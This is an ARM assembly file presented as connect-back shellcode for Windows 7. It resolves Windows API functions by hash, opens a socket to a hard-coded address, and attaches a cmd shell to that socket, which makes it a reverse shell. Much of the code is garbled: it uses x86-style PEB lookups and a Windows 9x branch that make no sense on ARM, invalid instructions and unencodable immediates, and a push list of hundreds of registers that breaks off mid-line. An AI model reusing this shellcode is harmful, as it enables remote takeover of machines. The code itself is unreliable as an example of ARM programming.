; Connectback shellcode for Windows 7 (ARM)
.section .text
.global _start

_start:
    ; Jump to the startup bounce point
    b startup_bnc

find_kernel32:
    ; Preserve registers
    push {r4, lr}
    mov r0, #0
    ldr r0, [r0, #0x30]
    tst r0, r0
    bmi find_kernel32_9x
find_kernel32_nt:
    ldr r0, [r0, #0x0c]
    ldr r4, [r0, #0x1c]
    ldr r0, [r4]
    ldr r0, [r0, #0x8]
    b find_kernel32_finished
find_kernel32_9x:
    ldr r0, [r0, #0x34]
    add r0, r0, #0x7c
    ldr r0, [r0, #0x3c]
find_kernel32_finished:
    pop {r4, lr}
    bx lr

find_function:
    ; Preserve all registers
    push {r0-r12, lr}
    mov r12, sp
    ldr r0, [r12, #0x24]
    ldr r1, [r0, #0x3c]
    ldr r2, [r0, r1, lsl #2]
    add r2, r0
    ldr r3, [r2, #0x18]
    ldr r4, [r2, #0x20]
    add r4, r0
find_function_loop:
    subs r3, r3, #1
    bmi find_function_finished
    ldr r5, [r4, r3, lsl #2]
    add r5, r0
    mov r6, #0
    mov r7, #0
compute_hash:
    ldrb r8, [r5], #1
    cmp r8, #0
    beq compute_hash_finished
    ror r6, r6, #13
    add r6, r6, r8
    b compute_hash
compute_hash_finished:
    ldr r8, [r12, #0x28]
    cmp r6, r8
    bne find_function_loop
    ldr r4, [r2, #0x24]
    add r4, r0
    ldrh r3, [r4, r3, lsl #1]
    ldr r4, [r2, #0x1c]
    add r4, r0
    ldr r0, [r4, r3, lsl #2]
    add r0, r0, r0
    str r0, [r12, #0x1c]
find_function_finished:
    pop {r0-r12, lr}
    bx lr

startup_bnc:
    b startup

resolve_symbols_for_dll:
    ldr r0, [r4], #4
    push {r0, r1}
    bl find_function
    str r0, [r5], #4
    add sp, sp, #8
    cmp r4, r3
    bne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    bx lr

kernel32_symbol_hashes:
    .word 0xec0e4e8e
    .word 0x16b3fe72
    .word 0x73e2d87e

ws2_32_symbol_hashes:
    .word 0xadf509d9
    .word 0x60aaf9ec

startup:
    sub sp, sp, #0x60
    mov r11, sp
    b get_absolute_address_forward
get_absolute_address_middle:
    b get_absolute_address_end
get_absolute_address_forward:
    bl get_absolute_address_middle
get_absolute_address_end:
    pop {r4}
    bl find_kernel32
    mov r1, r0
resolve_kernel32_symbols:
    sub r4, r4, #0x22
    add r5, r11, #0x04
    mov r3, r4
    add r3, r3, #0x0c
    bl resolve_symbols_for_dll
resolve_winsock_symbols:
    add r3, r3, #0x08
    mov r0, #0x3233
    push {r0}
    mov r0, #0x5f327377
    push {r0}
    mov r2, sp
    push {r3, r1, r2}
    bl [r11, #0x04]
    pop {r1, r3}
    mov r1, r0
    bl resolve_symbols_for_dll
initialize_cmd:
    mov r0, #0x646d6301
    asr r0, r0, #8
    push {r0}
    str sp, [r11, #0x30]
create_socket:
    mov r0, #0
    push {r0, r0, r0, r0}
    mov r0, #1
    push {r0}
    mov r0, #2
    push {r0}
    bl [r11, #0x10]
    mov r4, r0
do_connect:
    push {0x0101017f}
    mov r0, #0x5c110102
    sub r0, r0, #0x100
    push {r0}
    mov r2, sp
    mov r0, #0x10
    push {r0, r2, r4}
    bl [r11, #0x14]
initialize_process:
    mov r0, #0
    mov r1, #0x54
    sub sp, sp, r1
    mov r5, sp
    push {r5}
zero_structs:
    mov r0, #0
    mov r1, #0x54
    bl memset
initialize_structs:
    mov r0, #0x44
    strb r0, [r5]
    mov r0, #0x01
    strb r0, [r5, #0x2d]
    push {r5}
    mov r0, r4
    add r5, r5, #0x38
    str r0, [r5]
    str r0, [r5, #4]
    str r0, [r5, #8]
    pop {r5}
execute_process:
    mov r0, #0
    add r4, r5, #0x44
    push {r4, r5, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0, r0